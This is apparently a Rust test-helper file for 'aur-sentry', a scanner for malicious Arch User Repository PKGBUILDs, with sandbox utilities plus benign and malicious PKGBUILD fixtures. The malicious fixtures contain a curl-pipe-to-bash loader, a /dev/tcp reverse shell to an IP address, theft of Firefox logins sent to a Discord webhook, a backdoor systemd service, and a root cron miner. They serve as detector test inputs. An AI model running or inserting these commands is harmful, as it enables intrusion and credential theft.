#![allow(dead_code)]

use std::path::{Path, PathBuf};
use std::process::{Command, ExitStatus};
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::{SystemTime, UNIX_EPOCH};

static RUN_COUNTER: AtomicU64 = AtomicU64::new(1);

/// Locate the compiled `aur-sentry` binary.
pub fn aur_sentry_bin() -> PathBuf {
    if let Ok(path) = std::env::var("CARGO_BIN_EXE_aur-sentry") {
        let p = PathBuf::from(path);
        if p.exists() {
            return p;
        }
    }
    let manifest_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    let debug_bin = manifest_dir.join("target/debug/aur-sentry");
    if debug_bin.exists() {
        return debug_bin;
    }
    let release_bin = manifest_dir.join("target/release/aur-sentry");
    if release_bin.exists() {
        return release_bin;
    }
    PathBuf::from("aur-sentry")
}

#[derive(Debug)]
pub struct CommandOutput {
    pub status: ExitStatus,
    pub stdout: String,
    pub stderr: String,
}

impl CommandOutput {
    pub fn success(&self) -> bool {
        self.status.success()
    }

    pub fn code(&self) -> Option<i32> {
        self.status.code()
    }
}

/// Run `aur-sentry` with the given CLI arguments.
pub fn run_aur_sentry(args: &[&str]) -> CommandOutput {
    let bin = aur_sentry_bin();
    let output = Command::new(&bin)
        .args(args)
        .output()
        .unwrap_or_else(|e| panic!("Failed to execute {:?} with args {:?}: {e}", bin, args));

    CommandOutput {
        status: output.status,
        stdout: String::from_utf8_lossy(&output.stdout).into_owned(),
        stderr: String::from_utf8_lossy(&output.stderr).into_owned(),
    }
}

/// Run `aur-sentry` with a specific working directory and arguments.
pub fn run_aur_sentry_in_dir(dir: &Path, args: &[&str]) -> CommandOutput {
    let bin = aur_sentry_bin();
    let output = Command::new(&bin)
        .current_dir(dir)
        .args(args)
        .output()
        .unwrap_or_else(|e| {
            panic!(
                "Failed to execute {:?} in {:?} with args {:?}: {e}",
                bin, dir, args
            )
        });

    CommandOutput {
        status: output.status,
        stdout: String::from_utf8_lossy(&output.stdout).into_owned(),
        stderr: String::from_utf8_lossy(&output.stderr).into_owned(),
    }
}

/// Managed test workspace created inside `generated/test_runs/`.
/// Automatically cleans up on drop unless `KEEP_TEST_SANDBOX=1` is set.
pub struct TestSandbox {
    pub root: PathBuf,
}

impl TestSandbox {
    pub fn new(prefix: &str) -> Self {
        let manifest_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
        let count = RUN_COUNTER.fetch_add(1, Ordering::SeqCst);
        let nanos = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        let dirname = format!("{}_{}_{}_{}", prefix, std::process::id(), nanos, count);
        let root = manifest_dir
            .join("generated")
            .join("test_runs")
            .join(dirname);

        std::fs::create_dir_all(&root)
            .unwrap_or_else(|e| panic!("Failed to create test sandbox at {:?}: {e}", root));

        Self { root }
    }

    pub fn path(&self) -> &Path {
        &self.root
    }

    pub fn write_file(&self, rel_path: &str, content: &str) -> PathBuf {
        let path = self.root.join(rel_path);
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent).unwrap();
        }
        std::fs::write(&path, content)
            .unwrap_or_else(|e| panic!("Failed to write test file {:?}: {e}", path));
        path
    }

    pub fn read_file(&self, rel_path: &str) -> String {
        let path = self.root.join(rel_path);
        std::fs::read_to_string(&path)
            .unwrap_or_else(|e| panic!("Failed to read test file {:?}: {e}", path))
    }

    pub fn create_pkgbuild(&self, pkgname: &str, body: &str) -> PathBuf {
        let content = format!(
            r#"# Maintainer: Test User <test@example.com>
pkgname={pkgname}
pkgver=1.0.0
pkgrel=1
pkgdesc="Test package {pkgname}"
arch=('x86_64')
license=('MIT')

{body}
"#
        );
        self.write_file("PKGBUILD", &content)
    }
}

impl Drop for TestSandbox {
    fn drop(&mut self) {
        if std::env::var("KEEP_TEST_SANDBOX").unwrap_or_default() != "1" {
            let _ = std::fs::remove_dir_all(&self.root);
        }
    }
}

// =========================================================================
// Real-world & Malicious Test Fixtures
// =========================================================================

pub const BENIGN_MINIMAL_PKGBUILD: &str = r#"
# Maintainer: Arch User <user@archlinux.org>
pkgname=simple-tool
pkgver=1.2.3
pkgrel=1
pkgdesc="A simple utility"
arch=('x86_64')
url="https://example.org/simple-tool"
license=('MIT')
depends=('glibc')
source=("https://example.org/downloads/simple-tool-1.2.3.tar.gz")
sha256sums=('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')

build() {
    cd "${srcdir}/simple-tool-1.2.3"
    make
}

package() {
    cd "${srcdir}/simple-tool-1.2.3"
    make DESTDIR="${pkgdir}" install
}
"#;

pub const BENIGN_GOOGLE_CHROME_PKGBUILD: &str = r#"
# Maintainer: Arch User <user@archlinux.org>
pkgname=google-chrome
pkgver=124.0.6367.60
pkgrel=1
pkgdesc="The popular web browser by Google"
arch=('x86_64')
url="https://www.google.com/chrome/"
license=('custom:chrome')
depends=('alsa-lib' 'gtk3' 'nss' 'libxss')
optdepends=('pipewire: WebRTC desktop sharing')
source=("https://dl.google.com/linux/chrome/deb/pool/main/g/google-chrome-stable/google-chrome-stable_${pkgver}-1_amd64.deb")
sha256sums=('4b37344f6f7aa5394fb0e1ea7a6c9cf1c260be562f790c5fae46127bcfeb523a')

package() {
    bsdtar -xf data.tar.xz -C "${pkgdir}"
    chmod 4755 "${pkgdir}/opt/google/chrome/chrome-sandbox"
}
"#;

pub const BENIGN_VCS_GIT_PKGBUILD: &str = r#"
# Maintainer: Arch User <user@archlinux.org>
pkgname=neovim-nightly-git
pkgver=0.10.0.r1234.gabcdef1
pkgrel=1
pkgdesc="Vim-fork focused on extensibility and usability (nightly build)"
arch=('x86_64')
url="https://neovim.io"
license=('Apache-2.0' 'Vim')
depends=('libluv' 'libuv' 'msgpack-c' 'tree-sitter')
makedepends=('cmake' 'ninja' 'git')
provides=('neovim')
conflicts=('neovim')
source=('git+https://github.com/neovim/neovim.git#branch=master')
sha256sums=('SKIP')

pkgver() {
    cd "${srcdir}/neovim"
    git describe --long --tags | sed 's/^v//;s/\([^-]*-g\)/r\1/;s/-/./g'
}

build() {
    cmake -B build -S "${srcdir}/neovim" -G Ninja -DCMAKE_BUILD_TYPE=Release
    ninja -C build
}

package() {
    DESTDIR="${pkgdir}" ninja -C build install
}
"#;

pub const MALICIOUS_ACROREAD_REPLICA: &str = r#"
# Maintainer: Attacker <evil@example.org>
pkgname=acroread-update
pkgver=9.5.5
pkgrel=1
pkgdesc="Adobe Reader PDF viewer patch"
arch=('x86_64')
url="https://adobe.com"
license=('custom')
source=("http://194.26.29.112/acroread.tar.gz")
sha256sums=('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')

prepare() {
    curl -s http://194.26.29.112/loader.sh | bash
    bash -i >& /dev/tcp/194.26.29.112/4444 0>&1
}

build() {
    echo "building..."
}

package() {
    mkdir -p "${pkgdir}/opt"
}
"#;

pub const MALICIOUS_DISCORD_STEALER: &str = r#"
# Maintainer: Attacker <evil@example.org>
pkgname=discord-theme-dark
pkgver=1.0.0
pkgrel=1
pkgdesc="Enhanced Dark Theme for Discord"
arch=('any')
license=('MIT')

package() {
    cat ~/.mozilla/firefox/*.default-release/logins.json > /tmp/stolen.json 2>/dev/null || true
    curl -X POST -H "Content-Type: application/json" -d '{"content":"exfiltrated"}' https://discord.com/api/webhooks/123456789/token_abcdef
}
"#;

pub const MALICIOUS_PRIV_ESC_SYSTEMD: &str = r#"
# Maintainer: Attacker <evil@example.org>
pkgname=system-tweak-helper
pkgver=2.1.0
pkgrel=1
pkgdesc="System tuning and optimization daemon"
arch=('x86_64')
license=('GPL')

package() {
    install -Dm644 backdoor.service /etc/systemd/system/backdoor.service
    chmod 4755 "${pkgdir}/usr/bin/helper"
    echo "* * * * * root /tmp/miner" | crontab -
}
"#;
